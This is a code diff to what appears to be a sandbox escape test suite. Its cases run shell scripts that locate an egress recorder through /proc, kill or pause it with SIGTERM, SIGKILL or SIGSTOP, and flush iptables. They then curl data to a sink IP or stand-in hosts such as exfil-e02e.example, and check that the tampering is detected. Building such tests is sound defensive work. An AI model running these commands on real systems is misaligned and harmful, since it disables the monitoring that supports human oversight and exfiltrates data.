@@ -225,18 +225,73 @@ cp /srv/app/.env.canary /srv/app/tmp/copy.txt
 def esc(id, title, body, checks, **extra):
     add(id, "escape", title, body, checks, **extra)
 
-esc("escape-01-stop-recorder", "systemctl stop rt-egress, then call out", """
-systemctl stop rt-egress
-curl -s -m 3 -d 'rt-l4' "http://$SINK_IP:8080/e01" || true
-""", [chk("integrity_red", "integrity red: recorder not active", B)])
+# The recorder is found the way a root script can (systemd's D-Bus is hidden in the sandbox):
+# through /proc. It runs as its own user, so it should be invisible there and immune to signals.
+FIND_RECORDER = "\npid=$(pgrep -o -f '[r]t-egress serve')\necho \"recorder pid=${pid:-none}\""
 
-esc("escape-02-kill-recorder-gap", "SIGKILL the recorder, call out during the restart gap", """
-pid=$(systemctl show -p MainPID --value rt-egress)
-kill -9 "$pid" 2>/dev/null || true
+
+def recorder_gap(path=None, port=None):
+    """Tampering with the recorder is visible: integrity red, or the recorder kept running (same PID,
+    not paused) and the call was recorded. A call by name is recorded by the recorder (path); a call
+    straight to an IP address never completes its handshake, so it shows as a blocked connection to
+    the port (kernel log) or at least in the connect counter (out_of_scope network)."""
+    if path:
+        seen = chk("egress_seen", "attempt recorded", path=path)
+    else:
+        seen = chk("any_of", "attempt recorded (recorder, kernel log or connect counter)", of=[
+            chk("egress_seen", "connection to the sink port listed", port=port),
+            chk("scope_reason", "connection counted as denied", scope_kind="network")])
+    return [chk("any_of", "tampering is visible: integrity red, or the recorder kept running and the "
+                          "attempt was recorded", B, of=[
+        chk("integrity_red", "integrity red"),
+        chk("all_of", "recorder untouched and the attempt recorded", of=[
+            chk("integrity_check", "recorder kept running (same PID, not paused)", check="egress_recorder",
+                value="running"),
+            seen])])]
+
+
+esc("escape-01-stop-recorder", "Terminate the recorder found through /proc, then call out", FIND_RECORDER + """
+[ -n "$pid" ] && kill -TERM "$pid" && echo terminated
+curl -s -m 3 -d 'rt-l4' "http://$SINK_IP:8080/e01" || true
+""", recorder_gap(port=8080))
+
+esc("escape-02-kill-recorder-gap", "SIGKILL the recorder, call out during the restart gap", FIND_RECORDER + """
+[ -n "$pid" ] && kill -9 "$pid" && echo killed
 curl -s -m 2 -d 'during the gap' "http://$SINK_IP:8080/e02-gap" || true
 sleep 4
-""", [chk("any_of", "gap is visible: integrity red or the attempt recorded", B, of=[
-    chk("integrity_red", "integrity red"), chk("egress_seen", "attempt recorded", path="/e02-gap")])])
+""", recorder_gap(port=8080))
+
+esc("escape-02b-pgrep-kill-gap", "SIGKILL the recorder found through /proc, call out during the restart gap",
+    FIND_RECORDER + """
+[ -n "$pid" ] && kill -9 "$pid" && echo killed
+curl -s -m 2 -d 'during the gap' "http://$SINK_IP:8080/e02b-gap" || true
+sleep 4
+""", recorder_gap(port=8080))
+
+esc("escape-02c-sigstop-left", "SIGSTOP the recorder, call out, leave it stopped", FIND_RECORDER + """
+[ -n "$pid" ] && kill -STOP "$pid" && echo stopped
+curl -s -m 2 -d 'while stopped' "http://$SINK_IP:8080/e02c-stopped" || true
+sleep 1
+""", recorder_gap(port=8080))
+
+esc("escape-02d-sigstop-cont", "SIGSTOP the recorder, call out, SIGCONT before exit", FIND_RECORDER + """
+[ -n "$pid" ] && kill -STOP "$pid" && echo stopped
+curl -s -m 2 -d 'while stopped' "http://$SINK_IP:8080/e02d-stopped" || true
+[ -n "$pid" ] && kill -CONT "$pid" && echo continued
+sleep 3
+""", recorder_gap(port=8080))
+
+esc("escape-02e-sigstop-name-left", "Pause the recorder, call a name, leave it paused", FIND_RECORDER + """
+[ -n "$pid" ] && kill -STOP "$pid" && echo paused
+curl -s -m 3 -d 'x' http://exfil-e02e.example/e02e || true
+""", recorder_gap(path="/e02e"))
+
+esc("escape-02f-sigstop-name-cont", "Pause the recorder, call a name, resume before exit", FIND_RECORDER + """
+[ -n "$pid" ] && kill -STOP "$pid" && echo paused
+curl -s -m 3 -d 'x' http://exfil-e02f.example/e02f || true
+[ -n "$pid" ] && kill -CONT "$pid" && echo resumed
+sleep 3
+""", recorder_gap(path="/e02f"))
 
 esc("escape-03-iptables-flush", "iptables -F (filter, nat, v6), then call out", """
 iptables -F; iptables -t nat -F; ip6tables -F
